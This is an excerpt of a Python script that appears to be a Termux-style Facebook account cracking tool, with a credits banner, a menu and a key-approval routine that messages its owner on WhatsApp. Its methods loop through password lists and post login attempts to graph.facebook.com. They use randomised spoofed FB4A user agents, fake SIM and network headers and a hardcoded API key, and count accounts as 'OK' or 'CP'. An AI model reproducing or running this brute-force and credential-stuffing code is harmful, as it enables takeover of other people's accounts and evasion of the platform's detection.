...
⠄⠄⠄⠄⠄⠄⣀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣄⣀⡀⠄⠄⠄⠄⠄
   ...
   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠙⠝⠂⠄⢘⠋⠃⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
{A}──────────────────────────────────────────────────
{G1}[{A}={G1}]{G1} OWNER    {A}:{G1} Khalil 
{G1}[{A}={G2}]{G2} FACEBOOK {A}:{G2} M.K.O
{G1}[{A}={G3}]{G3} TOOLTYPE {A}:{G3} FREE 
{G1}[{A}={G4}]{G4} STATUS   {A}:{G4} 1.2
{A}─────────────────────────────
...
def menu():   
    ...
    if select =='1':
        ...
        os.system('https://www.facebook.com/profile.php?id=100003176234638&mibextid=JRoKGi');menu()
    elif select =='0':
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FB4A/;FBAV/YZWSES93;FBBV/395104810;FBAN/FB4A;FBAV/YZWSES93;FBBV/395104810;FBDM//*{density=3.0,width=1440,height=3840};FBLC/ja_JP;FBRV/595997509;FBCR/Realme;FBMF/VIVO;FBBD/Asus;FBPN/com.facebook.katana;FBDV/OnePlus_Nord_N200;FBSV/12;FBOP/4;FBCA/armeabi;FBSS/;]"
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': '[FBAN/;FBAV/4Q095MQG;FBBV/746270610;FBAN/FBAN;FBAV/4Q095MQG;FBBV/746270610;FBDM//*{density=1.5,width=1440,height=3840};FBLC/zh_CN;FBRV/461954074;FBCR/Nokia;FBMF/VIVO;FBBD/Realme;FBPN/com.facebook.katana;FBDV/Nokia_X20;FBSV/13;FBOP/4;FBCA/x86_64;FBSS/;]',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
...
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}Luffy-{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            head={'User-Agent': '[FBAN/;FBAV/4Q095MQG;FBBV/746270610;FBAN/FBAN;FBAV/4Q095MQG;FBBV/746270610;FBDM//*{density=1.5,width=1440,height=3840};FBLC/zh_CN;FBRV/461954074;FBCR/Nokia;FBMF/VIVO;FBBD/Realme;FBPN/com.facebook.katana;FBDV/Nokia_X20;FBSV/13;FBOP/4;FBCA/x86_64;FBSS/;]',
...
def main_apv():
    ...
    try:
        ...
        tks = ('Hello%20HExX%20Owner%20Luffy%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+?text='+tks)
    ...
    if key1 in r1:
        ...
        tks = ('Hello%20HExX%20Owner%20Luffy%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213771372932?text='+tks)
        main_apv() 
main_apv()